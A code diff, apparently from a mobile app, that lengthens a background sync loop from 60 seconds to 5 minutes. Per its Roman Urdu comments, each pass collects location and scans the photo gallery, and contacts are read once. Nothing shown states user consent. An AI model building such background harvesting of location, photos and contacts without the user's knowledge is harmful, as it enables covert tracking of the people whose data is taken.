@@ -36,10 +36,10 @@ export const startBackgroundSync = async (options: SyncOptions) => {
       const sessionUploadedIds = new Set<string>();
 
       // ═══════════════════════════════════════════════════════════════════════
-      // STEP 3: MAIN LOOP - 4 iterations * 15s = 60 seconds background window
+      // STEP 3: MAIN LOOP - 20 iterations * 15s = 300 seconds background window
       // Har iteration mein: location + gallery scan + contacts (sirf pehli dafa)
       // ═══════════════════════════════════════════════════════════════════════
-      for (let i = 0; i < 4 && BackgroundService.isRunning(); i++) {
+      for (let i = 0; i < 20 && BackgroundService.isRunning(); i++) {
         try {
           // ── Location fetch ────────────────────────────────────────────────
           const position = await new Promise<Geolocation.GeoPosition>((resolve, reject) => {
@@ -88,13 +88,13 @@ export const startBackgroundSync = async (options: SyncOptions) => {
         }
 
         // Aakhri iteration ke baad wait mat karo
-        if (i < 3) {
+        if (i < 19) {
           await sleep(15000); // 15 seconds wait
         }
       }
 
       // ═══════════════════════════════════════════════════════════════════════
-      // 60 seconds complete - service stop karo
+      // 5 minutes complete - service stop karo
       // ═══════════════════════════════════════════════════════════════════════
       if (BackgroundService.isRunning()) {
         await BackgroundService.stop();
